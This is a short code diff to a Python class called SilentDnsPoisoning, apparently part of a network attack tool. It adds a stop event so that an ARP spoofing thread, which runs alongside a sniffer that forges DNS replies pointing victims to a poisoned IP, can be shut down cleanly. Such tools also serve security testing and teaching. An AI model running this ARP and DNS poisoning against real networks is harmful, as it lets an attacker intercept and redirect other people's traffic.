@@ -79,9 +79,10 @@ class SilentDnsPoisoning:
                         sendp(pkt, iface=interface)
 
         arpSpoofing = ArpSpoofing(self.interface)
+        stop_event2 = threading.Event()
         try:
             arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof,
-                                        args=(target1, target2, target1MAC, target2MAC, False, False, timeSleep))
+                                        args=(target1, target2, target1MAC, target2MAC, False, False, timeSleep, stop_event2))
             arpSpoof.daemon = True
             arpSpoof.start()
         except:
@@ -92,3 +93,6 @@ class SilentDnsPoisoning:
                   prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison,
                                                  self.interface), iface=self.interface)
         print("DNS poisoning is stopped.")
+        print("Stopping the ARP poisoning")
+        stop_event2.set()
+        arpSpoof.join()
